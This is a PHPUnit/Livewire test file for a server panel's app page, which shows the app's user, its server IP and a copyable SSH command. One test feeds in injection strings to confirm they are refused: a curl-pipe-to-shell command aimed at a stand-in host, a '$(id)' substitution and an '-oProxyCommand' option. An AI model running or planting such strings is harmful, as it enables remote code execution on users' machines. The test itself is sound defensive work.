<?php

namespace CipiGui\Tests\Feature;

use CipiGui\Livewire\AppDetail;
use CipiGui\Livewire\Concerns\InteractsWithCipiServer;
use CipiGui\Models\CipiServer;
use CipiGui\Services\Access;
use CipiGui\Tests\TestCase;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Http;
use Livewire\Livewire;
use PHPUnit\Framework\Attributes\Test;

/**
 * The app page says where to connect and as whom (4.6.0): the app's Linux
 * user, the address of the server it runs on, and the `ssh` command made of
 * the two. The address is the one the panel keeps for the server; nothing is
 * asked of the server for it.
 */
class AppConnectionDetailsTest extends TestCase
{
    private CipiServer $server;

    /** What GET /api/apps/shop answers; a test changes it before opening the page. */
    private array $shop = ['app' => 'shop', 'user' => 'shop', 'domain' => 'shop.example.com', 'php' => '8.5', 'engine' => 'mariadb', 'node' => false, 'aliases' => [], 'repository' => 'git@github.com:acme/shop.git', 'branch' => 'main', 'env' => 'production'];

    protected function setUp(): void
    {
        parent::setUp();

        Http::fake(function (Request $request) {
            $path = parse_url($request->url(), PHP_URL_PATH);

            return match (true) {
                $path === '/api/apps/shop' && $request->method() === 'GET' => Http::response(['data' => $this->shop]),
                $path === '/api/php' => Http::response(['data' => ['default' => '8.5', 'versions' => [['version' => '8.5']]]]),
                default => Http::response(['data' => []]),
            };
        });

        $this->server = $this->server(['ip' => '203.0.113.24']);
        $this->actingAs($this->admin());
        session(['cipi_gui_server_id' => $this->server->id]);
    }

    #[Test]
    public function the_app_page_shows_its_user_the_ip_of_its_server_and_the_ssh_command(): void
    {
        Livewire::test(AppDetail::class, ['name' => 'shop'])
            ->assertSet('app.user', 'shop')
            ->assertSeeHtml('<dt>User</dt>')
            ->assertSeeHtml('data-app-user')
            ->assertSeeHtml('<dt>Server IP</dt>')
            ->assertSeeHtml('data-server-ip')
            ->assertSeeHtml('<span class="copyable-text">203.0.113.24</span>')
            ->assertSeeHtml('<dt>SSH</dt>')
            ->assertSeeHtml('<span class="copyable-text">ssh shop@203.0.113.24</span>')
            ->assertDontSeeHtml('data-server-ip-unknown');
    }

    #[Test]
    public function the_ip_stays_in_the_header_on_every_tab(): void
    {
        Livewire::test(AppDetail::class, ['name' => 'shop'])
            ->call('setTab', 'artisan')
            ->assertSet('activeTab', 'artisan')
            ->assertDontSeeHtml('<dt>Server IP</dt>')
            ->assertSeeHtml('class="copyable font-mono text-xs text-soft"')
            ->assertSeeHtml('<span class="copyable-text">203.0.113.24</span>');
    }

    #[Test]
    public function an_answer_without_user_names_it_after_the_app(): void
    {
        unset($this->shop['user']);

        Livewire::test(AppDetail::class, ['name' => 'shop'])
            ->assertSet('app.user', 'shop')
            ->assertSeeHtml('<span class="copyable-text">ssh shop@203.0.113.24</span>');
    }

    #[Test]
    public function without_a_known_ip_the_page_says_so_and_offers_no_ssh_command(): void
    {
        $this->server->forceFill(['ip' => null])->save();

        Livewire::test(AppDetail::class, ['name' => 'shop'])
            ->assertSeeHtml('data-app-user')
            ->assertSeeHtml('data-server-ip-unknown')
            ->assertSee('Not known yet')
            ->assertDontSeeHtml('data-ssh-command')
            ->assertDontSeeHtml('<dt>SSH</dt>')
            // No request is made to learn it: the page shows what the panel keeps.
            ->assertDontSeeHtml('copyable font-mono text-xs text-soft');

        Http::assertNotSent(fn (Request $r) => parse_url($r->url(), PHP_URL_PATH) === '/api/status');
    }

    #[Test]
    public function an_ipv6_address_is_shown_as_ssh_takes_it(): void
    {
        $this->server->forceFill(['ip' => '2001:db8::24'])->save();

        Livewire::test(AppDetail::class, ['name' => 'shop'])
            ->assertSeeHtml('<span class="copyable-text">ssh shop@2001:db8::24</span>');
    }

    #[Test]
    public function only_an_address_and_a_user_name_reach_the_command(): void
    {
        // Neither value is typed by the person who copies the command.
        $this->server->forceFill(['ip' => '203.0.113.24; curl evil.example | sh'])->save();
        $this->shop['user'] = 'shop $(id)';

        Livewire::test(AppDetail::class, ['name' => 'shop'])
            ->assertSet('app.user', 'shop')
            ->assertSeeHtml('data-server-ip-unknown')
            ->assertDontSeeHtml('data-ssh-command')
            ->assertDontSee('evil.example')
            ->assertDontSee('$(id)');

        $this->assertNull(AppDetail::serverIp($this->server->fresh()));
        $this->assertNull(AppDetail::serverIp(null));
        $this->assertNull(AppDetail::sshCommand('', '203.0.113.24'));
        $this->assertNull(AppDetail::sshCommand('shop', null));
        $this->assertSame('ssh shop@203.0.113.24', AppDetail::sshCommand('shop', '203.0.113.24'));
    }

    #[Test]
    public function the_user_is_a_user_name_or_nothing(): void
    {
        $n = new class
        {
            use InteractsWithCipiServer {
                normalizeApp as public;
            }

            public function dispatch(...$args): void {}
        };

        $this->assertSame('shop', $n->normalizeApp(['app' => 'shop', 'user' => 'shop'])['user']);
        $this->assertSame('shop', $n->normalizeApp(['app' => 'shop'])['user']);                       // GET /api/apps of an older server
        $this->assertSame('shop', $n->normalizeApp(['app' => 'shop', 'user' => ''])['user']);
        $this->assertSame('shop', $n->normalizeApp(['app' => 'shop', 'user' => ['x']])['user']);
        $this->assertSame('shop', $n->normalizeApp(['app' => 'shop', 'user' => 'a b'])['user']);
        $this->assertSame('', $n->normalizeApp(['app' => 'Shop;id', 'user' => '-oProxyCommand=x'])['user']);
        $this->assertSame('', $n->normalizeApp([])['user']);
    }

    #[Test]
    public function a_member_who_has_only_the_app_sees_them_too(): void
    {
        $member = $this->member();
        Access::replaceGrants($member->id, [], [$this->server->id => ['shop' => ['view']]]);
        Access::flush();
        $this->actingAs($member);

        Livewire::test(AppDetail::class, ['name' => 'shop'])
            ->assertSeeHtml('data-app-user')
            ->assertSeeHtml('<span class="copyable-text">ssh shop@203.0.113.24</span>');

        // The hint of the unknown address names Connections without linking a page the member cannot open.
        $this->server->forceFill(['ip' => null])->save();
        Livewire::test(AppDetail::class, ['name' => 'shop'])
            ->assertSeeHtml('data-server-ip-unknown')
            ->assertSee('Connections by an admin')
            ->assertDontSeeHtml('class="text-link">Connections</a>');
    }
}
